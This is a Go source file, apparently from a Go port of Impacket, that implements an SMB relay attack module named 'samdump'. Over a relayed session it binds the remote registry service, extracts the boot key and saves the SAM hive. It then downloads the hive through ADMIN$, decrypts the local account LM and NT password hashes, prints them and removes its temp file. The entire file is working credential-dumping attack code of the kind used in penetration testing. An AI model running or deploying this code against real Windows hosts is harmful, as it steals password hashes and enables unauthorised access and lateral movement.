package relay

import (
	"encoding/hex"
	"fmt"
	"log"

	"gopacket/internal/build"
	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/winreg"
	"gopacket/pkg/registry"
)

// SAMDumpAttack dumps local SAM hashes via remote registry (Impacket default SMB attack).
type SAMDumpAttack struct{}

func (a *SAMDumpAttack) Name() string { return "samdump" }

func (a *SAMDumpAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("samdump attack requires SMB session")
	}
	return samDumpAttack(client, config)
}

func samDumpAttack(client *SMBRelayClient, cfg *Config) error {
	log.Printf("[*] Dumping local SAM hashes via remote registry on %s", cfg.TargetAddr)

	// Connect to IPC$ and open winreg pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("winreg")
	if err != nil {
		return fmt.Errorf("open winreg pipe: %v", err)
	}

	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	if err := rpcClient.Bind(winreg.UUID, winreg.MajorVersion, winreg.MinorVersion); err != nil {
		client.ClosePipe(fileID)
		return fmt.Errorf("bind winreg: %v", err)
	}

	if build.Debug {
		log.Printf("[D] SAMDump: bound to winreg interface")
	}

	// Get boot key
	bootKey, err := getBootKeyViaRelay(rpcClient)
	if err != nil {
		client.ClosePipe(fileID)
		return fmt.Errorf("get boot key: %v", err)
	}

	log.Printf("[*] Target system bootKey: 0x%s", hex.EncodeToString(bootKey))

	// Save SAM hive only
	hklm, err := winreg.OpenLocalMachine(rpcClient, winreg.MAXIMUM_ALLOWED)
	if err != nil {
		client.ClosePipe(fileID)
		return fmt.Errorf("open HKLM: %v", err)
	}

	samTempFile, err := saveHiveViaRelay(rpcClient, hklm, "SAM")
	if err != nil {
		winreg.BaseRegCloseKey(rpcClient, hklm)
		client.ClosePipe(fileID)
		return fmt.Errorf("save SAM hive: %v", err)
	}

	winreg.BaseRegCloseKey(rpcClient, hklm)
	client.ClosePipe(fileID)

	// Download and process SAM hive
	log.Printf("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)")

	samData, err := client.DownloadFile("ADMIN$", "Temp\\"+samTempFile)
	if err != nil {
		cleanupTempFiles(client, samTempFile, "")
		return fmt.Errorf("download SAM hive: %v", err)
	}

	samHive, err := registry.Open(samData)
	if err != nil {
		cleanupTempFiles(client, samTempFile, "")
		return fmt.Errorf("parse SAM hive: %v", err)
	}

	users, err := registry.DumpSAM(samHive, bootKey)
	if err != nil {
		cleanupTempFiles(client, samTempFile, "")
		return fmt.Errorf("dump SAM: %v", err)
	}

	for _, user := range users {
		lmHash := hex.EncodeToString(user.LMHash)
		ntHash := hex.EncodeToString(user.NTHash)
		log.Printf("%s:%d:%s:%s:::", user.Username, user.RID, lmHash, ntHash)
	}

	// Cleanup
	cleanupTempFiles(client, samTempFile, "")

	return nil
}
